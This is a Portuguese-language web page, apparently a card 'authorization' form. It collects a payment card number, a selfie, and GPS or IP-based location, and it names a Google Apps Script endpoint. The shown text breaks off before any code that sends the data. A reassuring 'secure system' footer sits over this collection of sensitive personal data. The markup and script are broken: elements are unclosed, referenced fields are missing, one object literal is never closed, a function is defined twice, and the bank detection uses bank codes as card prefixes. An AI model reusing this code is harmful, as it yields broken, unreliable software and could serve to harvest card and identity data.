<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
<style>

* { box-sizing: border-box; }

body {
  margin: 0;
  font-family: 'Segoe UI', sans-serif;
  background: linear-gradient(135deg, #003366, #0055A5);
  display: flex;
  justify-content: center;
  align-items: flex-start;
  min-height: 100vh;
  padding: 20px 0;
}

.container {
  background: #fff;
  width: 100%;
  max-width: 430px;
  border-radius: 20px;
  padding: 30px;
  box-shadow: 0 20px 40px rgba(0,0,0,0.25);
}

h2 {
  text-align: center;
  color: #003366;
  margin-bottom: 25px;
}

h3 {
  color: #003366;
  margin-bottom: 10px;
}

/* CARTÃO */
.credit-card-preview {
  position: relative;
  background: linear-gradient(135deg, #FFC300, #FFB000);
  border-radius: 18px;
  padding: 20px;
  color: white;
  margin-bottom: 25px;
  box-shadow: 0 12px 25px rgba(0,0,0,0.3);
  overflow: hidden;
}

.credit-card-preview::after {
  content: "";
  position: absolute;
  top: 0; left: -150%;
  width: 60%; height: 100%;
  background: linear-gradient(120deg, transparent, rgba(255,255,255,0.5), transparent);
  transform: skewX(-20deg);
  animation: brilho 4s infinite;
}

@keyframes brilho {
  0%   { left: -150%; }
  100% { left: 150%; }
}

.chip {
  width: 45px; height: 35px;
  background: linear-gradient(135deg, #d4af37, #f5e28a);
  border-radius: 6px;
  margin-top: 10px;
  box-shadow: inset 0 0 4px rgba(0,0,0,0.5);
}

.logo-bandeira { position: absolute; top: 15px; right: 20px; }
.logo-bandeira img { height: 28px; display: none; }

.card-number {
  font-size: 20px; letter-spacing: 3px;
  margin: 20px 0;
  font-family: 'Courier New', monospace;
}

.card-name { font-size: 14px; }
.card-exp  { font-size: 12px; }

/* CAMPOS */
.field { position: relative; margin-bottom: 22px; }

.field input,
.field select {
  width: 100%; padding: 14px 10px;
  border: none; border-bottom: 2px solid #ccc;
  outline: none; font-size: 16px; background: transparent;
}

.field input:focus,
.field select:focus { border-bottom: 2px solid #0055A5; }

.field label {
  position: absolute; left: 10px; top: 14px;
  color: #777; font-size: 14px;
  transition: 0.3s; pointer-events: none;
}

.field input:focus + label,
.field input:not(:placeholder-shown) + label,
.field select:focus + label,
.field select.has-value + label {
  top: -8px; font-size: 12px; color: #0055A5;
}

/* UPLOAD FOTO */
.selfie-area { margin-bottom: 20px; }
#inputSelfie { display: none; }

.upload-label {
  display: block; width: 100%; padding: 14px;
  background: #0055A5; color: #fff;
  border-radius: 14px; font-size: 16px; font-weight: bold;
  text-align: center; cursor: pointer;
  margin-bottom: 10px; transition: opacity 0.2s;
}
.upload-label:hover { opacity: 0.88; }

#selfiePreview { display: none; }

.selfie-status { font-size: 13px; color: #777; margin-top: 6px; text-align: center; }
.selfie-status.ok   { color: #28a745; font-weight: bold; }
.selfie-status.erro { color: #dc3545; }

/* BOTÕES */
.btn {
  width: 100%; padding: 14px; border: none;
  border-radius: 14px; font-size: 16px; font-weight: bold;
  cursor: pointer; margin-bottom: 10px; transition: opacity 0.2s;
}
.btn:disabled { background: #ccc !important; color: #888 !important; cursor: not-allowed; }
.btn-retake { background: #6c757d; color: #fff; display: none; }
.btn-gerar  { background: #FFC300; color: #003366; }

/* LOGO */
.logo-area { text-align: center; margin-bottom: 20px; }
.logo-area img { max-width: 160px; }

/* LOADING */
.loading {
  display: none; text-align: center;
  padding: 10px; color: #0055A5; font-weight: bold;
}
.loading::after {
  content: ''; display: inline-block;
  width: 16px; height: 16px;
  border: 3px solid #0055A5; border-top-color: transparent;
  border-radius: 50%; animation: spin 0.8s linear infinite;
  margin-left: 8px; vertical-align: middle;
}
@keyframes spin { to { transform: rotate(360deg); } }

.footer { text-align: center; font-size: 12px; margin-top: 15px; color: #777; }

.erro-msg {
  background: #fff3f3; border: 1px solid #f5c6c6;
  color: #dc3545; border-radius: 8px; padding: 10px;
  font-size: 13px; margin-bottom: 10px; display: none;
}

</style>
</head>
<body>

<div class="container">

  <div class="logo-area">
    <img id="logo" alt="AABB">
  </div>

  <h2>Autorização de Cartão</h2>

  <!-- CARTÃO VISUAL -->
  <div class="credit-card-preview" id="cartaoPreview">
    <div style="display:flex;justify-content:space-between;align-items:flex-start;">
      <div id="previewBanco" style="font-size:13px;font-weight:bold;color:rgba(255,255,255,0.75);letter-spacing:1px;"></div>
      <div class="logo-bandeira"><canvas id="imgBandeira" width="110" height="55" style="display:block;"></canvas></div>

    <div class="card-number" id="previewNumero">0000 0000 0000 0000</div>

  <div class="field">

    <input type="text" id="cartao" maxlength="19" placeholder=" " oninput="atualizarCartao()">

    <button class="btn btn-retake" id="btnRetirar" onclick="retirarFoto()">🔄 Trocar Foto</button>
    <img id="selfiePreview" alt="Foto carregada">

  <div class="erro-msg" id="erroMsg"></div>

  <div class="loading" id="loading">Gerando PDF, aguarde</div>

  <!-- GERAR -->
  <button class="btn btn-gerar" id="btnGerar" onclick="gerarAutorizacao()">
    Gerar Autorização
  </button>

  <div class="footer">Sistema seguro • Conexão criptografada</div>

</div>

<script>

const SCRIPT_URL = "https://script.google.com/macros/s/AKfycby7tpFZXvRQuNNoZ05qpRJT4k4yB5j2_mhBDd9OUYHQaMQj891GMy5fA9BUK7kZvYz6/exec";

/* ── DESENHAR LOGO DA BANDEIRA NO CANVAS (SVG puro, sem imagem externa) ── */
function desenharLogo(ctx, bandeira, x, y, w, h){
  ctx.save();
  ctx.translate(x, y);

  if(bandeira === "VISA"){
    // VISA: fundo azul escuro + texto branco bold italic
    ctx.font = "italic bold " + Math.round(h*0.85) + "px Arial";
    ctx.fillStyle = "#FFFFFF";
    ctx.textAlign = "right";
    ctx.textBaseline = "top";
    // Sombra azul
    ctx.shadowColor = "rgba(0,0,100,0.5)";
    ctx.shadowBlur = 4;
    ctx.fillText("VISA", w, h*0.05);
    ctx.shadowBlur = 0;

  } else if(bandeira === "MASTERCARD"){
    // Dois círculos sobrepostos: vermelho + laranja
    const r = h * 0.46;
    const cy = h / 2;
    const cx1 = w/2 - r*0.5;
    const cx2 = w/2 + r*0.5;
    ctx.beginPath(); ctx.arc(cx1, cy, r, 0, Math.PI*2); ctx.fillStyle = "#EB001B"; ctx.fill();
    ctx.beginPath(); ctx.arc(cx2, cy, r, 0, Math.PI*2); ctx.fillStyle = "#F79E1B"; ctx.fill();
    // Interseção laranja médio
    ctx.beginPath();
    ctx.arc(cx1, cy, r, -Math.PI/3, Math.PI/3); ctx.arc(cx2, cy, r, Math.PI+Math.PI/3, Math.PI-Math.PI/3, true);
    ctx.closePath(); ctx.fillStyle = "#FF5F00"; ctx.fill();

  } else if(bandeira === "AMERICAN EXPRESS"){
    ctx.fillStyle = "rgba(255,255,255,0.15)";
    ctx.beginPath(); ctx.roundRect(0, 0, w, h, 6); ctx.fill();
    ctx.fillStyle = "#FFFFFF";
    ctx.font = "bold " + Math.round(h*0.28) + "px Arial";
    ctx.textAlign = "left";
    ctx.textBaseline = "top";
    ctx.letterSpacing = "1px";
    ctx.fillText("AMERICAN", 4, h*0.08);
    ctx.fillText("EXPRESS", 4, h*0.46);

  } else if(bandeira === "DINERS"){
    const r = h * 0.38;
    const cy = h / 2;
    ctx.strokeStyle = "rgba(255,255,255,0.9)";
    ctx.lineWidth = 2.5;
    ctx.beginPath(); ctx.arc(w*0.32, cy, r, 0, Math.PI*2); ctx.stroke();
    ctx.beginPath(); ctx.arc(w*0.58, cy, r, 0, Math.PI*2); ctx.stroke();
    ctx.fillStyle = "rgba(255,255,255,0.85)";
    ctx.font = "bold " + Math.round(h*0.22) + "px Arial";
    ctx.textAlign = "left";
    ctx.textBaseline = "top";
    ctx.fillText("Diners", w*0.66, h*0.15);
    ctx.fillText("Club", w*0.68, h*0.52);

  } else if(bandeira === "HIPERCARD"){
    ctx.fillStyle = "#FFFFFF";
    ctx.font = "bold " + Math.round(h*0.52) + "px Arial";
    ctx.textAlign = "right";
    ctx.textBaseline = "middle";
    ctx.fillText("hiper", w, h*0.42);
    ctx.font = "bold " + Math.round(h*0.52) + "px Arial";
    ctx.fillStyle = "#FFD700";
    ctx.fillText("card", w, h*0.82);

  } else if(bandeira === "ELO"){
    // Elo: círculo com E + "lo" em laranja
    const r = h * 0.42;
    const cy = h/2;
    ctx.beginPath(); ctx.arc(r+2, cy, r, 0, Math.PI*2);
    ctx.fillStyle = "#FFD100"; ctx.fill();
    ctx.font = "bold " + Math.round(r*1.2) + "px Arial";
    ctx.fillStyle = "#000"; ctx.textAlign = "center"; ctx.textBaseline = "middle";
    ctx.fillText("e", r+2, cy+1);
    ctx.fillStyle = "#FFFFFF";
    ctx.font = "bold " + Math.round(h*0.55) + "px Arial";
    ctx.textAlign = "left"; ctx.textBaseline = "middle";
    ctx.fillText("lo", r*2+8, cy);
  }

  ctx.restore();
}

/* ── GERAR IMAGEM DO CARTÃO ── */
function gerarImagemCartao(bandeira, numero, nome, validade){
  return new Promise(function(resolve){
  const canvas  = document.createElement("canvas");
  canvas.width  = 560;
  canvas.height = 330;
  const ctx = canvas.getContext("2d");

  // === IDENTIDADE VISUAL POR BANDEIRA ===
  const identidade = {
    "VISA": {
      bg: (ctx,x,y,w,h) => {
        // Gradiente azul clássico VISA
        const g = ctx.createLinearGradient(x,y,x+w,y+h);
        g.addColorStop(0,"#1A1F71"); g.addColorStop(1,"#1565C0");
        ctx.fillStyle = g;
      },
      chip: "#C8A400",
      numColor: "#FFFFFF",
      textoColor: "rgba(255,255,255,0.88)",
      contactless: "rgba(255,255,255,0.45)"
    },
    "MASTERCARD": {
      bg: (ctx,x,y,w,h) => {
        const g = ctx.createLinearGradient(x,y,x+w,y+h);
        g.addColorStop(0,"#1a1a1a"); g.addColorStop(1,"#2d2d2d");
        ctx.fillStyle = g;
        // Padrão sutil de fundo
      },
      chip: "#D4AF37",
      numColor: "#FFFFFF",
      textoColor: "rgba(255,255,255,0.85)",
      contactless: "rgba(255,255,255,0.4)"
    },
    "AMERICAN EXPRESS": {
      bg: (ctx,x,y,w,h) => {
        const g = ctx.createLinearGradient(x,y,x+w,y+h);
        g.addColorStop(0,"#108168"); g.addColorStop(1,"#006651");
        ctx.fillStyle = g;
      },
      chip: "#C0C0C0",
      numColor: "#FFFFFF",
      textoColor: "rgba(255,255,255,0.88)",
      contactless: "rgba(255,255,255,0.4)"
    },
    "DINERS": {
      bg: (ctx,x,y,w,h) => {
        const g = ctx.createLinearGradient(x,y,x+w,y+h);
        g.addColorStop(0,"#004E7C"); g.addColorStop(1,"#0079BE");
        ctx.fillStyle = g;
      },
      chip: "#D4AF37",
      numColor: "#FFFFFF",
      textoColor: "rgba(255,255,255,0.85)",
      contactless: "rgba(255,255,255,0.4)"
    },
    "HIPERCARD": {
      bg: (ctx,x,y,w,h) => {
        const g = ctx.createLinearGradient(x,y,x+w,y+h);
        g.addColorStop(0,"#8B0000"); g.addColorStop(1,"#CC0000");
        ctx.fillStyle = g;
      },
      chip: "#D4AF37",
      numColor: "#FFFFFF",
      textoColor: "rgba(255,255,255,0.88)",
      contactless: "rgba(255,255,255,0.4)"
    },
    "ELO": {
      bg: (ctx,x,y,w,h) => {
        const g = ctx.createLinearGradient(x,y,x+w,y+h);
        g.addColorStop(0,"#111111"); g.addColorStop(0.5,"#1a1a1a"); g.addColorStop(1,"#2a2a2a");
        ctx.fillStyle = g;
      },
      chip: "#FFD100",
      numColor: "#FFFFFF",
      textoColor: "rgba(255,255,255,0.85)",
      contactless: "rgba(255,255,255,0.4)"
    }
  };

  const id = identidade[bandeira] || {
    bg: (ctx,x,y,w,h) => {
      const g = ctx.createLinearGradient(x,y,x+w,y+h);
      g.addColorStop(0,"#1a3a6b"); g.addColorStop(1,"#2255a0");
      ctx.fillStyle = g;
    },
    chip: "#D4AF37", numColor:"#FFFFFF",
    textoColor:"rgba(255,255,255,0.85)", contactless:"rgba(255,255,255,0.4)"
  };

  // Sombra flutuante
  ctx.shadowColor   = "rgba(0,0,0,0.45)";
  ctx.shadowBlur    = 18;
  ctx.shadowOffsetX = 6;
  ctx.shadowOffsetY = 8;

  const r = 24, x = 10, y = 10, w = 510, h = 290;

  // Fundo
  id.bg(ctx, x, y, w, h);
  ctx.beginPath();
  ctx.moveTo(x+r,y); ctx.lineTo(x+w-r,y);
  ctx.quadraticCurveTo(x+w,y,x+w,y+r);
  ctx.lineTo(x+w,y+h-r);
  ctx.quadraticCurveTo(x+w,y+h,x+w-r,y+h);
  ctx.lineTo(x+r,y+h);
  ctx.quadraticCurveTo(x,y+h,x,y+h-r);
  ctx.lineTo(x,y+r);
  ctx.quadraticCurveTo(x,y,x+r,y);
  ctx.closePath();
  ctx.fill();
  ctx.shadowColor = "transparent";

  // Padrão decorativo de fundo por bandeira
  ctx.save();
  ctx.beginPath();
  ctx.moveTo(x+r,y); ctx.lineTo(x+w-r,y);
  ctx.quadraticCurveTo(x+w,y,x+w,y+r);
  ctx.lineTo(x+w,y+h-r);
  ctx.quadraticCurveTo(x+w,y+h,x+w-r,y+h);
  ctx.lineTo(x+r,y+h);
  ctx.quadraticCurveTo(x,y+h,x,y+h-r);
  ctx.lineTo(x,y+r);
  ctx.quadraticCurveTo(x,y,x+r,y);
  ctx.closePath();
  ctx.clip();

  if(bandeira === "MASTERCARD"){
    // Círculos decorativos sutis no fundo
    ctx.globalAlpha = 0.06;
    for(let i=0;i<4;i++){
      ctx.beginPath();
      ctx.arc(420+i*30, 280, 80+i*25, 0, Math.PI*2);
      ctx.fillStyle = "#FF5F00"; ctx.fill();
    }
    ctx.globalAlpha = 1;
  } else if(bandeira === "VISA"){
    // Faixa diagonal sutil
    ctx.globalAlpha = 0.07;
    const gd = ctx.createLinearGradient(x, y+h, x+w, y);
    gd.addColorStop(0,"transparent"); gd.addColorStop(0.5,"#4FC3F7"); gd.addColorStop(1,"transparent");
    ctx.fillStyle = gd;
    ctx.fillRect(x, y, w, h);
    ctx.globalAlpha = 1;
  } else if(bandeira === "ELO"){
    // Linhas diagonais douradas sutis
    ctx.globalAlpha = 0.08;
    ctx.strokeStyle = "#FFD100"; ctx.lineWidth = 30;
    for(let i=-2;i<6;i++){
      ctx.beginPath();
      ctx.moveTo(x + i*120, y); ctx.lineTo(x + i*120 - 80, y+h);
      ctx.stroke();
    }
    ctx.globalAlpha = 1;
  } else if(bandeira === "HIPERCARD"){
    // Ondas vermelhas sutis
    ctx.globalAlpha = 0.1;
    ctx.strokeStyle = "#FF6666"; ctx.lineWidth = 40;
    for(let i=0;i<4;i++){
      ctx.beginPath();
      ctx.arc(x+w+50, y+h/2, 100+i*70, Math.PI*0.6, Math.PI*1.4);
      ctx.stroke();
    }
    ctx.globalAlpha = 1;
  }
  ctx.restore();

  // Reflexo sutil no topo
  const refGrad = ctx.createLinearGradient(x, y, x, y+h*0.5);
  refGrad.addColorStop(0, "rgba(255,255,255,0.15)");
  refGrad.addColorStop(1, "rgba(255,255,255,0)");
  ctx.fillStyle = refGrad;
  ctx.beginPath();
  ctx.moveTo(x+r,y); ctx.lineTo(x+w-r,y);
  ctx.quadraticCurveTo(x+w,y,x+w,y+r);
  ctx.lineTo(x+w,y+h/2); ctx.lineTo(x,y+h/2); ctx.lineTo(x,y+r);
  ctx.quadraticCurveTo(x,y,x+r,y);
  ctx.closePath();
  ctx.fill();

  // Nome do banco
  const banco = detectarBanco(numero);
  if(banco){
    ctx.font = "bold 17px Arial";
    ctx.fillStyle = id.textoColor;
    ctx.textAlign = "left";
    ctx.fillText(banco, 32, 50);
  }

  // Chip dourado
  ctx.fillStyle = id.chip;
  ctx.beginPath(); ctx.roundRect(32, 86, 56, 42, 7); ctx.fill();
  ctx.strokeStyle = "rgba(255,255,255,0.4)"; ctx.lineWidth = 1.5; ctx.stroke();
  ctx.strokeStyle = "rgba(0,0,0,0.3)"; ctx.lineWidth = 1;
  ctx.beginPath(); ctx.moveTo(32,107); ctx.lineTo(88,107); ctx.stroke();
  ctx.beginPath(); ctx.moveTo(60,86);  ctx.lineTo(60,128); ctx.stroke();
  ctx.strokeStyle = "rgba(0,0,0,0.2)"; ctx.lineWidth = 0.8;
  ctx.strokeRect(38, 92, 44, 30);

  // Contactless
  ctx.strokeStyle = id.contactless;
  ctx.lineWidth = 2.5;
  for(let i=0;i<3;i++){
    ctx.beginPath();
    ctx.arc(114, 107, 12+i*10, -Math.PI*0.6, Math.PI*0.6);
    ctx.stroke();
  }

  // Número
  ctx.font = "bold 26px 'Courier New', monospace";
  ctx.textAlign = "left";
  ctx.fillStyle = id.numColor;
  ctx.shadowColor = "rgba(0,0,0,0.3)";
  ctx.shadowBlur = 4;
  ctx.fillText(numero.replace(/\s/g,"  "), 32, 178);
  ctx.shadowColor = "transparent";

  // Nome
  ctx.font = "15px Arial";
  ctx.fillStyle = id.textoColor;
  ctx.fillText(nome.substring(0,32).toUpperCase(), 32, 218);

  // Validade
  ctx.font = "13px Arial";
  ctx.fillStyle = "rgba(255,255,255,0.6)";
  ctx.fillText("VÁLIDO: " + validade, 32, 246);

  // Logo bandeira
  desenharLogo(ctx, bandeira, x+w-130, y+8, 120, 62);

  resolve(canvas.toDataURL("image/png"));
  }); // fim Promise
}

// Detecção de banco pelo BIN
function detectarBanco(numero){
  const n = numero.replace(/\D/g,"");
  if(/^(237|300|301|302|303|304|305|306)/.test(n)) return "BRADESCO";
  if(/^(001|070|0001)/.test(n)) return "BANCO DO BRASIL";
  if(/^(341|356)/.test(n)) return "ITAÚ";
  if(/^(033|748)/.test(n)) return "SANTANDER";
  if(/^(104|001)/.test(n)) return "CAIXA";
  if(/^(745|746|422)/.test(n)) return "CITIBANK";
  if(/^(260|290|323|336|380)/.test(n)) return "NUBANK";
  if(/^(290|336|077|197|403|212)/.test(n)) return "INTER";
  if(/^(389)/.test(n)) return "MERCANTIL";
  if(/^(756)/.test(n)) return "SICOOB";
  return "";
}

const coresCartao = {
  "VISA":             "linear-gradient(135deg,#1A1F71,#1565C0)",
  "MASTERCARD":       "linear-gradient(135deg,#1a1a1a,#2d2d2d)",
  "AMERICAN EXPRESS": "linear-gradient(135deg,#108168,#006651)",
  "DINERS":           "linear-gradient(135deg,#004E7C,#0079BE)",
  "HIPERCARD":        "linear-gradient(135deg,#8B0000,#CC0000)",
  "ELO":              "linear-gradient(135deg,#111111,#2a2a2a)",
  "PADRAO":           "linear-gradient(135deg,#1a3a6b,#2255a0)"

/* ── BANDEIRA ── */
function identificarBandeira(numero){
  if(/^(4011|4312|4389|4514|4576|5041|5066|5090|6277|6362|6363)/.test(numero)) return "ELO";
  if(/^3[47]/.test(numero))              return "AMERICAN EXPRESS";
  if(/^3(0[0-5]|6)/.test(numero))       return "DINERS";
  if(/^(6062|3841|60)/.test(numero))    return "HIPERCARD";
  if(/^5[1-5]/.test(numero) || /^2(2[2-9]|[3-7][0-9])/.test(numero)) return "MASTERCARD";
  if(/^4/.test(numero))                  return "VISA";
  return "OUTRO";
}

/* ── LUHN ── */
function validarLuhn(numero){
  let soma = 0, alt = false;
  for(let i = numero.length - 1; i >= 0; i--){
    let n = parseInt(numero[i]);
    if(alt){ n *= 2; if(n > 9) n -= 9; }
    soma += n; alt = !alt;
  }
  return soma % 10 === 0;
}

/* ── ATUALIZAR CARTÃO ── */
function atualizarCartao(){
  const input = document.getElementById("cartao");
  let numero = input.value.replace(/\D/g,'');

  // Limite de dígitos por bandeira
  const band = identificarBandeira(numero);
  const maxDigitos = {"AMERICAN EXPRESS":15,"DINERS":14}[band] || 16;
  if(numero.length > maxDigitos) numero = numero.substring(0, maxDigitos);

  // Formatar com espaços a cada 4 (AMEX: 4-6-5)
  if(band === "AMERICAN EXPRESS"){
    numero.replace(/(\d{1,4})(\d{1,6})?(\d{1,5})?/, function(_,a,b,c){
      input.value = [a,b,c].filter(Boolean).join(" ");
    });
    input.value = numero.replace(/(\d{4})(\d{1,6})?(\d{1,5})?/,"$1 $2 $3").trim();
  } else {
    input.value = numero.replace(/(\d{4})(?=\d)/g,"$1 ");
  }

  document.getElementById("previewNumero").innerText = input.value || "0000 0000 0000 0000";
  document.getElementById("cartaoPreview").style.background = coresCartao[band] || coresCartao["PADRAO"];

  // Banco
  const banco = detectarBanco(numero);
  const elBanco = document.getElementById("previewBanco");
  if(elBanco) elBanco.innerText = banco;

  const canvasBandeira = document.getElementById("imgBandeira");
  const ctxB = canvasBandeira.getContext("2d");
  ctxB.clearRect(0, 0, canvasBandeira.width, canvasBandeira.height);
  if(band !== "OUTRO") desenharLogo(ctxB, band, 0, 0, canvasBandeira.width, canvasBandeira.height);

  // Só bloqueia botão se número estiver COMPLETO e Luhn inválido
  const btnGerar = document.getElementById("btnGerar");
  if(numero.length === maxDigitos && !validarLuhn(numero)){
    btnGerar.disabled = true;
    mostrarErro("Número do cartão inválido. Verifique os dígitos.");
  } else {
    btnGerar.disabled = false;
    document.getElementById("erroMsg").style.display = "none";
  }
}

/* ── FOTO ── */
let selfieBase64 = "";

function carregarFoto(event){
  const file = event.target.files[0];
  if(!file) return;

  const reader = new FileReader();
  reader.onload = function(e){
    // Converte qualquer formato (JPEG, HEIC, etc) para PNG via canvas
    const img = new Image();
    img.onload = function(){
      const padding = 16;
      const maxW = 600, maxH = 800;
      let w = img.width, h = img.height;
      if(w > maxW){ h = Math.round(h * maxW / w); w = maxW; }
      if(h > maxH){ w = Math.round(w * maxH / h); h = maxH; }
      const canvas  = document.createElement("canvas");
      canvas.width  = w + padding * 2;
      canvas.height = h + padding * 2;
      const ctx = canvas.getContext("2d");
      // Fundo transparente com sombra flutuante
      ctx.shadowColor   = "rgba(0,0,0,0.45)";
      ctx.shadowBlur    = 16;
      ctx.shadowOffsetX = 5;
      ctx.shadowOffsetY = 7;
      ctx.fillStyle = "#ffffff";
      ctx.fillRect(padding, padding, w, h);
      ctx.shadowColor = "transparent";
      ctx.drawImage(img, padding, padding, w, h);
      selfieBase64 = canvas.toDataURL("image/png");
      document.getElementById("labelUpload").style.display = "none";
      document.getElementById("btnRetirar").style.display  = "block";
      setStatus("✅ Foto carregada com sucesso!", "ok");
    };
    img.src = e.target.result;
  };
  reader.readAsDataURL(file);
}

/* ── LOCALIZAÇÃO ── */
function obterLocalizacao(){
  return new Promise(function(resolve){

    function usarIP(){
      fetch("https://cloudflare.com/cdn-cgi/trace")
        .then(r => r.text()).catch(() => "")
        .then(function(txt){
          const ipMatch = txt.match(/ip=([^\n]+)/);
          const ip = ipMatch ? ipMatch[1].trim() : "";
          console.log("IP cliente:", ip);
          resolve({ lat: 0, lon: 0, localizacaoCliente: "", clienteIp: ip || "" });
        });
    }

    // GPS em qualquer dispositivo (mobile e desktop)
    if(navigator.geolocation){
      navigator.geolocation.getCurrentPosition(
        function(pos){
          const lat = pos.coords.latitude;
          const lon = pos.coords.longitude;
          console.log("GPS OK:", lat, lon);

          // Rejeita coordenadas de Virginia (servidores Google: ~36.6, ~-78.3)
          const eVirginia = (lat > 35 && lat < 38 && lon > -80 && lon < -77);
          if(eVirginia){
            console.log("GPS retornou Virginia (servidor Google), usando IP");
            usarIP();
            return;
          }
          fetch("https://nominatim.openstreetmap.org/reverse?format=json&lat=" + lat + "&lon=" + lon, {
            headers: { "Accept-Language": "pt-BR" }
          })
          .then(r => r.json()).catch(() => null)
          .then(function(geo){
            let loc = "";
            if(geo && geo.address){
              const a = geo.address;
              const cidade = a.city || a.town || a.village || a.municipality || "";
              const estado = a.state || "";
              const pais   = a.country || "";
              loc = [cidade, estado, pais].filter(Boolean).join(", ");
            }
            console.log("Localização GPS:", loc);
            resolve({ lat: lat, lon: lon, localizacaoCliente: loc || ("Lat: " + lat.toFixed(4) + ", Lon: " + lon.toFixed(4)), clienteIp: "" });
          });
        },
        function(err){
          // GPS negado ou falhou — usa IP via Cloudflare
          console.log("GPS falhou, usando IP:", err.message);
          fetch("https://cloudflare.com/cdn-cgi/trace")
            .then(r => r.text()).catch(() => "")
            .then(function(txt){
              const ipMatch = txt.match(/ip=([^\n]+)/);
              const ip = ipMatch ? ipMatch[1].trim() : "";
              console.log("IP cliente:", ip);
              resolve({ lat: 0, lon: 0, localizacaoCliente: "", clienteIp: ip || "" });
            });
        },
        { timeout: 15000, enableHighAccuracy: false }
      );
    } else {
      // Sem GPS — usa IP
      fetch("https://cloudflare.com/cdn-cgi/trace")
        .then(r => r.text()).catch(() => "")
        .then(function(txt){
          const ipMatch = txt.match(/ip=([^\n]+)/);
          const ip = ipMatch ? ipMatch[1].trim() : "";
          resolve({ lat: 0, lon: 0, localizacaoCliente: "", clienteIp: ip || "" });
        });
    }
  });
}

/* ── GERAR IMAGEM DO CARTÃO ── */
function gerarImagemCartao(bandeira, numero, nome, validade){
  return new Promise(function(resolve){
  const canvas  = document.createElement("canvas");
  canvas.width  = 560;
  canvas.height = 330;
  const ctx = canvas.getContext("2d");

  // Sombra flutuante
  ctx.shadowColor   = "rgba(0,0,0,0.45)";
  ctx.shadowBlur    = 18;
  ctx.shadowOffsetX = 6;
  ctx.shadowOffsetY = 8;

  const cores = {
    "VISA":             ["#1A1F71","#2E5FD5"],
    "MASTERCARD":       ["#1a1a1a","#3a3a3a"],
    "AMERICAN EXPRESS": ["#1B4F8A","#2E77BC"],
    "DINERS":           ["#004E7C","#0079BE"],
    "HIPERCARD":        ["#8B0000","#CC1111"],
    "ELO":              ["#111111","#333333"],
    "OUTRO":            ["#1a3a6b","#2255a0"]
  };

  const [c1, c2] = cores[bandeira] || cores["OUTRO"];
  const grad = ctx.createLinearGradient(10, 10, 520, 300);
  grad.addColorStop(0, c1);
  grad.addColorStop(1, c2);
  ctx.fillStyle = grad;

  // Cartão com margem suficiente para a sombra
  const r = 24, x = 10, y = 10, w = 510, h = 290;
  ctx.beginPath();
  ctx.moveTo(x+r,y); ctx.lineTo(x+w-r,y);
  ctx.quadraticCurveTo(x+w,y,x+w,y+r);
  ctx.lineTo(x+w,y+h-r);
  ctx.quadraticCurveTo(x+w,y+h,x+w-r,y+h);
  ctx.lineTo(x+r,y+h);
  ctx.quadraticCurveTo(x,y+h,x,y+h-r);
  ctx.lineTo(x,y+r);
  ctx.quadraticCurveTo(x,y,x+r,y);
  ctx.closePath();
  ctx.fill();

  ctx.shadowColor = "transparent";

  // Reflexo sutil
  const refGrad = ctx.createLinearGradient(10, 10, 10, 150);
  refGrad.addColorStop(0, "rgba(255,255,255,0.18)");
  refGrad.addColorStop(1, "rgba(255,255,255,0)");
  ctx.fillStyle = refGrad;
  ctx.beginPath();
  ctx.moveTo(x+r,y); ctx.lineTo(x+w-r,y);
  ctx.quadraticCurveTo(x+w,y,x+w,y+r);
  ctx.lineTo(x+w,y+h/2); ctx.lineTo(x,y+h/2); ctx.lineTo(x,y+r);
  ctx.quadraticCurveTo(x,y,x+r,y);
  ctx.closePath();
  ctx.fill();

  // Nome do banco
  const banco = detectarBanco(numero);
  if(banco){
    ctx.font = "bold 17px Arial";
    ctx.fillStyle = "rgba(255,255,255,0.75)";
    ctx.textAlign = "left";
    ctx.fillText(banco, 32, 48);
  }

  // Chip dourado
  ctx.fillStyle = "#d4af37";
  ctx.beginPath(); ctx.roundRect(32, 86, 56, 42, 7); ctx.fill();
  ctx.strokeStyle = "#f5e28a"; ctx.lineWidth = 1.5; ctx.stroke();
  ctx.strokeStyle = "#b8960c"; ctx.lineWidth = 1;
  ctx.beginPath(); ctx.moveTo(32,107); ctx.lineTo(88,107); ctx.stroke();
  ctx.beginPath(); ctx.moveTo(60,86);  ctx.lineTo(60,128); ctx.stroke();
  ctx.strokeStyle = "#c8a000"; ctx.lineWidth = 0.8;
  ctx.strokeRect(38, 92, 44, 30);

  // Contactless
  ctx.strokeStyle = "rgba(255,255,255,0.4)";
  ctx.lineWidth = 2;
  for(let i=0;i<3;i++){
    ctx.beginPath();
    ctx.arc(114, 107, 12+i*10, -Math.PI*0.6, Math.PI*0.6);
    ctx.stroke();
  }

  // Número
  ctx.font = "bold 26px 'Courier New', monospace";
  ctx.textAlign = "left";
  ctx.fillStyle = "white";
  ctx.shadowColor = "rgba(0,0,0,0.3)";
  ctx.shadowBlur = 4;
  ctx.fillText(numero.replace(/\s/g,"  "), 32, 178);
  ctx.shadowColor = "transparent";

  // Nome
  ctx.font = "15px Arial";
  ctx.fillStyle = "rgba(255,255,255,0.85)";
  ctx.fillText(nome.substring(0,32).toUpperCase(), 32, 218);

  // Validade
  ctx.font = "13px Arial";
  ctx.fillStyle = "rgba(255,255,255,0.65)";
  ctx.fillText("VÁLIDO: " + validade, 32, 246);

  // Logo bandeira via desenharLogo (canvas puro, sem imagem externa)
  desenharLogo(ctx, bandeira, x+w-130, y+8, 120, 62);
  resolve(canvas.toDataURL("image/png"));
  }); // fim Promise
}

/* ── GERAR QR CODE via qrcodejs ── */
function gerarQRCanvas(texto, tamanho){
  return new Promise(function(resolve){
    const div = document.createElement("div");
    div.style.cssText = "position:absolute;left:-9999px;top:-9999px;";
    document.body.appendChild(div);
    try {
      new QRCode(div, { text: texto, width: tamanho, height: tamanho, correctLevel: QRCode.CorrectLevel.M });
      // qrcodejs cria um <canvas> ou <img>
      setTimeout(function(){
        const el = div.querySelector("canvas") || div.querySelector("img");
        const out = document.createElement("canvas");
        out.width = out.height = tamanho;
        const ctx = out.getContext("2d");
        ctx.fillStyle="#fff"; ctx.fillRect(0,0,tamanho,tamanho);
        if(el) ctx.drawImage(el, 0, 0, tamanho, tamanho);
        document.body.removeChild(div);
        resolve(out);
      }, 100);
    } catch(e){
      document.body.removeChild(div);
      // fallback: canvas branco
      const out = document.createElement("canvas");
      out.width = out.height = tamanho;
      resolve(out);
    }
  });
}

/* ── GERAR IMAGEM RODAPÉ (QR + dados juntos) ── */
async function gerarImagemRodape(localizacao, dataHora, codigo){
  const qrCanvas = await gerarQRCanvas(codigo, 100);

